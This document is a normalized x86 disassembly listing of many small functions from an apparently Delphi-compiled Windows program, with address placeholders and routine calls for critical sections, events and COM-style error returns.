add [ esp + 0x4 ] 0xffffffd8
jmp sub_419a60
sub_412107
add [ esp + 0x4 ] 0xffffffd4
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
sub_412474
push ecx
mov [ esp ] ax
mov [ esp + 0x2 ] dx
mov eax [ esp ]
pop edx
retn
sub_412598
mov eax [ eax + 0xc ]
call sub_41375c
retn
sub_41286f
jmp sub_40387c
sub_412876
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41287c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_413914
test eax eax
setge al
pop esi
pop ebx
retn
sub_412b7f
jmp sub_40387c
sub_412b86
mov esp ebp
pop ebp
retn
sub_412c54
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_412c60
push ebx
mov ebx edx
mov edx ebx
call sub_412a74
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
call sub_4127d4
sub_412d0c
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_412e67
jmp sub_40387c
sub_412f3b
jmp sub_40387c
sub_412f4c
mov eax [ eax - 0x38 ]
or eax eax
je r-xdata
retn
mov eax [ eax + 0x2 ]
sub_412fb8
jmp sub_40387c
sub_412fbf
pop ebx
mov esp ebp
pop ebp
retn
sub_41300a
jmp sub_40387c
sub_413011
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_41309d
jmp sub_40387c
sub_4130a4
pop ebx
pop ebp
retn
sub_4130ea
jmp sub_40387c
sub_4130f1
pop ebx
pop ebp
retn
sub_413136
jmp sub_40387c
sub_41313d
pop ebx
pop ebp
retn
sub_413187
jmp sub_40387c
sub_41318e
pop esi
pop ebx
pop ebp
retn
sub_4131e2
jmp sub_40387c
sub_4131e9
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_413316
jmp sub_40387c
sub_4133ec
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_4139fc
sub_4134dc
jmp sub_40387c
sub_413666
jmp sub_40387c
sub_41366d
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413707
jmp sub_40387c
sub_41370e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41372d
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_413726
jmp sub_40387c
sub_41372d
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_413790
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_413a58
xor edx edx
mov eax ebx
call sub_413a1c
pop ebx
retn
sub_413808
mov eax [ ebp + 0x4 ]
retn
sub_41383e
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41388c
jmp sub_40387c
sub_413893
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_413898
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_4138b0
xor edx edx
call sub_4138b8
retn
sub_4139a0
mov edx [ eax + 0x8 ]
dec edx
call sub_4138b8
retn
sub_413ac8
retn
sub_413b82
jmp sub_40387c
sub_413b89
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_40349c
sub_413c18
jmp sub_40387c
sub_413c1f
pop ebx
pop ecx
pop ebp
retn
sub_413c24
push ebx
mov ebx eax
lea eax [ ebx + 0x8 ]
push eax
call EnterCriticalSection
mov eax [ ebx + 0x4 ]
pop ebx
retn
sub_413c7b
jmp sub_40387c
sub_413c82
pop ebx
pop ecx
pop ebp
retn
sub_413c88
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_413cc4
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3c0
call sub_4038b4
retn
sub_413cdc
mov ecx eax
cmp edx eax
jge r-xdata
mov eax ecx
retn
mov ecx edx
sub_413db7
retn
sub_413db8
cmp edx [ eax + 0x4 ]
jae sub_413cc4
mov eax [ eax + 0x8 ]
bt [ eax ] edx
sbb eax eax
and eax 0x1
retn
sub_413e74
test edx edx
je r-xdata
xor edx edx
call sub_413e88
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx ]
retn
sub_413f3e
jmp sub_40387c
sub_413f45
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413f58
xchg edx eax
call sub_413e88
retn
sub_413f60
retn
sub_413ff9
jmp sub_40387c
sub_414000
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41414a
jmp sub_40387c
sub_41425a
jmp sub_40387c
sub_414261
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41427e
lea eax [ ebp - 0xc ]
call sub_403e78
retn
sub_414277
jmp sub_40387c
sub_41427e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414308
jmp sub_40387c
sub_414320
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_4143dc
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_414485
jmp sub_40387c
sub_41448c
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414498
mov eax [ ebp + 0x4 ]
retn
sub_4144ce
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41451c
jmp sub_40387c
sub_414523
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4145e2
jmp sub_40387c
sub_4145e9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41460b
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403e9c
retn
sub_414604
jmp sub_40387c
sub_41460b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414614
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_41461c
xor eax eax
retn
sub_414665
jmp sub_40387c
sub_41466c
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41477f
jmp sub_40387c
sub_414786
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414814
jmp sub_40387c
sub_41481b
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4148eb
jmp sub_40387c
sub_4148f2
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4149a8
jmp sub_40387c
sub_4149af
pop esi
pop ecx
pop ebp
retn
sub_414a34
jmp sub_40387c
sub_414a3b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414a58
lea eax [ ebp - 0x8 ]
call sub_403e78
retn
sub_414a51
jmp sub_40387c
sub_414a58
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_414ae4
jmp sub_40387c
sub_414b01
jmp sub_40387c
sub_414b08
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_414b44
retn
sub_414bc7
jmp sub_40387c
sub_414bce
mov eax [ ebp - 0x8 ]
call sub_417708
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414bf3
lea eax [ ebp - 0xc ]
call sub_403e78
retn
sub_414bec
jmp sub_40387c
sub_414bf3
mov esp ebp
pop ebp
retn
sub_414c43
jmp sub_40387c
sub_414c4a
pop esi
pop ecx
pop ebp
retn
sub_414c9d
jmp sub_40387c
sub_414ca4
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414cac
retn
sub_414d27
jmp sub_40387c
sub_414d2e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414dcb
jmp sub_40387c
sub_414dd2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414def
lea eax [ ebp - 0x8 ]
call sub_403e78
retn
sub_414de8
jmp sub_40387c
sub_414def
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_414df4
retn
sub_414e6e
jmp sub_40387c
sub_414e75
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414e7c
mov eax edx
mov edx ecx
call sub_407c1c
retn
sub_414e88
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x4
jne r-xdata
mov al [ ebx + 0x7 ]
pop ebx
retn
mov dl 0x3d
mov eax ebx
call sub_414ea0
sub_414f18
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop ebx
retn
sub_414f88
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x22 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_414fa4
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_415198
mov eax [ eax + 0x18 ]
retn
sub_41519c
mov eax [ eax + 0x14 ]
retn
sub_415238
push ebx
push esi
mov esi eax
push 0x0
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop esi
pop ebx
retn
sub_415444
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
shl edx 0x3
lea eax [ ebx + 0x10 ]
call sub_4026fc
mov [ ebx + 0x18 ] esi
pop esi
pop ebx
retn
sub_415480
test dl dl
je r-xdata
mov edx [ eax ]
call [ edx + 0x80 ]
retn
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_415498
push ebx
mov ebx [ eax + 0x10 ]
mov ecx [ ebx + ecx * 8 ]
mov ebx [ eax + 0x10 ]
mov edx [ ebx + edx * 8 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_4154ac
mov edx sub_415498
mov ecx [ eax ]
call [ ecx + 0x94 ]
retn
sub_4154f4
cmp [ eax + 0x1e ] 0x0
je r-xdata
mov eax edx
mov edx ecx
call sub_407c1c
retn
mov eax edx
mov edx ecx
call sub_407be4
retn
sub_415590
retn
sub_415888
jmp sub_40387c
sub_41588f
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4158f0
jmp sub_40387c
sub_4158f7
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41593c
mov eax [ eax + 0x4 ]
call sub_408174
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_41594c
mov eax [ eax + 0x4 ]
call sub_4081a0
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_415988
push ebx
mov ebx edx
mov ecx eax
mov eax ebx
cdq
push edx
push eax
mov eax ecx
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_415b31
jmp sub_40387c
sub_415b90
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
retn
sub_415c20
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_415c70
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
sub_415e5b
jmp sub_40387c
sub_415e62
mov esp ebp
pop ebp
retn
sub_415f0c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3c0
call sub_4038b4
retn
sub_415f94
mov [ eax + 0x18 ] edx
retn
sub_416110
mov ecx edx
mov edx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
xchg edx eax
call sub_4107e4
retn
sub_416197
jmp sub_40387c
sub_41619e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41624a
jmp sub_40387c
sub_416251
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4163f5
jmp sub_40387c
sub_416447
jmp sub_40387c
sub_416466
jmp sub_40387c
sub_41646d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41648c
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_416485
jmp sub_40387c
sub_41648c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41652f
jmp sub_40387c
sub_4165b7
jmp sub_40387c
sub_4165c4
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3c0
call sub_4038b4
pop ebx
retn
sub_4165dc
mov eax [ rw-data ]
call sub_4165c4
retn
sub_416614
push ebx
call sub_41069c
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_4165dc
sub_416781
jmp sub_40387c
sub_416788
mov eax [ ebp - 0x4 ]
add eax 0x70
call sub_403e78
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_4168a8
jmp sub_40387c
sub_4168af
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4169a6
jmp sub_40387c
sub_4169c3
jmp sub_40387c
sub_4169ca
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_416ac8
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_415510
mov edx [ ebx + 0x14 ]
sub edx [ ebx + 0x10 ]
sub eax edx
pop ebx
retn
sub_416b8c
push ebx
mov ebx eax
mov eax ebx
call sub_418540
cmp al 0x9
sete al
pop ebx
retn
sub_416beb
jmp sub_40387c
sub_416bf2
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_416c98
jmp sub_40387c
sub_416c9f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_416f1e
jmp sub_4035c8
sub_416f4a
jmp sub_4035c8
sub_416fec
jmp sub_4035c8
sub_41708f
jmp sub_4035c8
sub_417267
jmp sub_4035c8
sub_4172a9
jmp sub_40387c
sub_4172d9
jmp sub_40387c
sub_4172e0
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41734f
jmp sub_40387c
sub_417426
jmp sub_40387c
sub_41742d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417700
mov dl 0x1
call sub_416668
retn
sub_417838
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
sub_417841
jmp sub_40387c
j_sub_417838
jmp sub_417838
sub_417848
pop ebx
mov esp ebp
pop ebp
retn
sub_417850
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_418650
mov eax [ rw-data ]
call sub_4165c4
pop ebp
retn
j_sub_4036f4
jmp sub_4036f4
j_sub_4036f4#2
jmp sub_4036f4
sub_417a3c
jmp sub_40387c
sub_417a43
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417b23
jmp sub_40387c
sub_417b2a
mov esp ebp
pop ebp
retn
sub_417be2
jmp sub_40387c
sub_417be9
pop ecx
pop ecx
pop ebp
retn
sub_417eeb
jmp sub_40387c
sub_417ef2
pop ebx
mov esp ebp
pop ebp
retn
sub_418197
jmp sub_40387c
sub_41819e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_403128
retn
sub_4181b7
jmp sub_40387c
sub_4181db
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_4035c8
sub_418212
jmp sub_4035c8
sub_418251
jmp sub_40387c
sub_418258
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41827a
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_403e9c
retn
sub_418273
jmp sub_40387c
sub_41827a
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418301
jmp sub_4035c8
sub_41832e
jmp sub_40387c
sub_418335
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_418340
push ecx
mov edx esp
mov ecx 0x4
call sub_416b04
mov eax [ esp ]
cmp eax [ rw-data ]
je r-xdata
pop edx
retn
mov eax [ rw-data ]
call sub_4165c4
sub_41844d
jmp sub_40387c
sub_418454
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_418533
jmp sub_40387c
sub_41853a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418590
jmp sub_40387c
sub_418597
pop ebx
pop ecx
pop ebp
retn
sub_4187df
jmp sub_40387c
sub_4187e6
pop ecx
pop ecx
pop ebp
retn
sub_418829
jmp sub_40387c
sub_418830
pop ebx
pop ecx
pop ebp
retn
sub_4188cc
jmp sub_40387c
sub_4188d3
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418981
jmp sub_40387c
sub_418988
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418994
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_418bef
jmp sub_40387c
sub_418bf6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418c1b
mov eax [ ebp - 0x8 ]
call sub_403128
mov eax [ ebp - 0x4 ]
call sub_403128
retn
sub_418c14
jmp sub_40387c
sub_418c1b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418c40
lea eax [ ebp - 0x1c ]
call sub_4054b4
lea eax [ ebp - 0x18 ]
call sub_403e78
retn
sub_418c39
jmp sub_40387c
sub_418c40
pop ebx
mov esp ebp
pop ebp
retn
sub_418e52
jmp sub_40387c
sub_418e59
pop ebx
mov esp ebp
pop ebp
retn
sub_418eac
push ebx
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x10 ]
mov eax [ ebx + 0x4 ]
call sub_415774
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
sub_418ec4
test dl dl
je r-xdata
mov dl 0x8
call sub_419048
retn
mov dl 0x9
call sub_419048
retn
sub_418f4c
mov dl 0x1
call sub_419048
retn
sub_418f54
xor edx edx
call sub_419048
retn
sub_419039
jmp sub_40387c
sub_419040
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41905c
push rw-data
call InitializeCriticalSection
push r-xdata
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_40c714
sub_419090
push rw-data
call DeleteCriticalSection
mov eax [ rw-data ]
push eax
call CloseHandle
retn
sub_4190a8
mov eax [ rw-data ]
push eax
call ResetEvent
retn
sub_4190b4
push ebx
mov ebx eax
push ebx
mov eax [ rw-data ]
push eax
call WaitForSingleObject
test eax eax
jne r-xdata
pop ebx
retn
call sub_4190a8
sub_4191da
jmp sub_4035c8
sub_419209
jmp sub_40387c
sub_41923f
jmp sub_40387c
sub_419246
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419265
push rw-data
call LeaveCriticalSection
retn
sub_41925e
jmp sub_40387c
sub_419265
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419334
test [ eax + 0x1c ] 0x8
jne r-xdata
retn
call sub_419510
sub_419394
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_417650
mov [ ebx + 0x18 ] ax
pop esi
pop ebx
retn
sub_4193a8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_417650
mov [ ebx + 0x1a ] ax
pop esi
pop ebx
retn
sub_4193bc
movzx eax [ eax + 0x18 ]
xchg edx eax
call sub_418ed8
retn
sub_4193c8
movzx eax [ eax + 0x1a ]
xchg edx eax
call sub_418ed8
retn
sub_419670
xor eax eax
retn
sub_419674
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_41967c
xor eax eax
retn
sub_419680
retn
sub_419684
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403ecc
pop esi
pop ebx
retn
sub_419698
mov eax [ eax + 0x4 ]
retn
sub_41969c
retn
sub_4196a0
xor eax eax
retn
sub_4196a4
retn
sub_4196a8
push ebx
mov ebx eax
or [ ebx + 0x1c ] 0x40
pop ebx
retn
sub_4196b4
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xffbf
pop ebx
retn
sub_4196c0
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xfffe
pop ebx
retn
sub_4196cc
retn
sub_4196d0
xchg edx eax
call sub_4172f4
retn
sub_4196d8
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
retn
sub_419760
push esi
mov esi eax
mov eax edx
mov edx esi
mov si 0xfff4
call sub_403324
pop esi
retn
sub_419774
retn
sub_419854
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403ecc
pop esi
pop ebx
retn
sub_419894
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_4199e0
push ebx
cmp [ eax + 0x20 ] 0x0
je r-xdata
call sub_403370
pop ebx
retn
mov eax [ eax + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
pop ebx
retn
sub_4199f8
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_419a80
retn
sub_419ac8
retn
sub_419b00
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_419b18
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_419d3c
mov eax [ ebx + 0x10 ]
mov si 0xffef
call sub_403324
pop esi
pop ebx
retn
sub_419b60
mov al 0x1
retn
sub_419b64
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_419b6c
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_419c14
xor eax eax
retn
sub_419c18
retn
sub_419c44
retn
sub_419cdc
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_419cf0
mov [ edx + 0x10 ] eax
mov eax [ eax + 0x50 ]
call sub_41375c
retn
sub_419e37
jmp sub_4035c8
sub_419e3c
mov ebx 0x1
call sub_403930
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_419e9f
jmp sub_4035c8
sub_419ea4
mov ebx 0x80030103
call sub_403930
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_419f22
jmp sub_4035c8
sub_419f27
mov ebx 0x80030009
call sub_403930
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
sub_419f85
jmp sub_4035c8
sub_419f8a
mov ebx 0x8000ffff
call sub_403930
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41a108
xchg [ ecx ] esp
sub_41a155
jmp sub_40387c
sub_41a166
jmp sub_4035c8
sub_41a16b
mov [ ebp - 0x4 ] 0x8000ffff
call sub_403930
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a194
lea eax [ ebp + 0xc ]
call sub_4054b4
retn
sub_41a18d
jmp sub_40387c
sub_41a194
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_41a1a0
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_41a1ac
push ebp
mov ebp esp
mov eax 0x80030102
pop ebp
retn 0x4
sub_41a1b8
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_41a1c4
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_41a233
jmp sub_4035c8
sub_41a238
mov esi 0x8000ffff
call sub_403930
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41a24c
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_41a2b9
jmp sub_40387c
sub_41a2c0
mov eax [ rw-data ]
call sub_403128
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41a2d0
call sub_4130a8
retn
sub_41a398
test eax eax
je r-xdata
retn
mov edx [ rw-data ]
mov [ eax + 0x5 ] edx
mov [ rw-data ] eax
sub_41a53c
jmp sub_40387c
sub_41a543
pop ebp
retn
sub_41a5d1
jmp sub_40387c
sub_41a5d8
pop ebp
retn
sub_41a8b1
jmp sub_40387c
sub_41a8b8
pop ebp
retn
sub_41a8bc
sub [ rw-data ] 0x1
retn
sub_41af10

sub_41af6c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_41afb2
inc ecx
add [ eax + 0x3f ] bl
inc ecx
add [ eax + 0x3f ] ah
inc ecx
add [ eax ] cl
int3
sub_41b2a1
add eax 0xffffffd8
jmp sub_41f26c
sub_41b2a9
add [ esp + 0x4 ] 0xffffffd8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xc ]
sub_41b376
cld
jmp eax
sub_41b7cc
test eax eax
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
push eax
call DeleteObject
sub_41b840
mov ecx edx
mov edx eax
xor eax eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_41b8b4
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_41b8c0
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_41b9a0
jmp sub_40387c
sub_41b9a7
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41ba37
jmp sub_40387c
sub_41bac9
jmp sub_40387c
sub_41bad0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41bb34
jmp sub_40387c
sub_41bb3b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41bba3
jmp sub_40387c
sub_41bbaa
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41bc4d
jmp sub_40387c
sub_41bc54
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41c0ac
push 0x33
mov ecx rw-data
call sub_413368
retn
sub_41c0bc
push 0x33
mov ecx rw-data
call sub_413328
retn
sub_41c0cc
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_41c0f0
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
retn
push edx
call LeaveCriticalSection
sub_41c2c4
push 0x11
mov ecx rw-data
call sub_413328
retn
sub_41c404
push ebx
mov ebx eax
mov eax ebx
call sub_41c0cc
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_41c4be
jmp sub_40387c
sub_41c4c5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c0f0
retn
sub_41c4db
jmp sub_40387c
sub_41c4f4
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0xb
[ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_41c551
jmp sub_40387c
sub_41c558
pop ebx
pop ecx
pop ebp
retn
sub_41c6d1
jmp sub_40387c
sub_41c6f9
jmp sub_40387c
sub_41c700
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_41c76c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
add edx 0x1b
call sub_4040dc
pop esi
pop ebx
retn
sub_41c7e0
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
push eax
push 0x48
mov eax ebx
call sub_41c73c
push eax
call sub_405fa4
neg eax
pop ebx
retn
sub_41c81c
mov eax [ eax + 0x10 ]
mov dl [ eax + 0x19 ]
mov eax edx
retn
sub_41c854
mov eax [ eax + 0x10 ]
mov al [ eax + 0x18 ]
retn
sub_41c884
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1a ]
retn
sub_41c9a2
jmp sub_40387c
sub_41c9a9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c0f0
retn
sub_41c9bf
jmp sub_40387c
sub_41ca35
jmp sub_40387c
sub_41ca3c
pop ebx
pop ecx
pop ebp
retn
sub_41ca40
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
retn
sub_41caf6
jmp sub_40387c
sub_41cb28
push esi
cmp dl [ eax + 0x18 ]
je r-xdata
pop esi
retn
mov [ eax + 0x18 ] dl
mov si 0xfffd
call sub_403324
sub_41cb3c
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_41cc7b
jmp sub_40387c
sub_41cc82
xor eax eax
pop edx
pop ecx
pop ecx
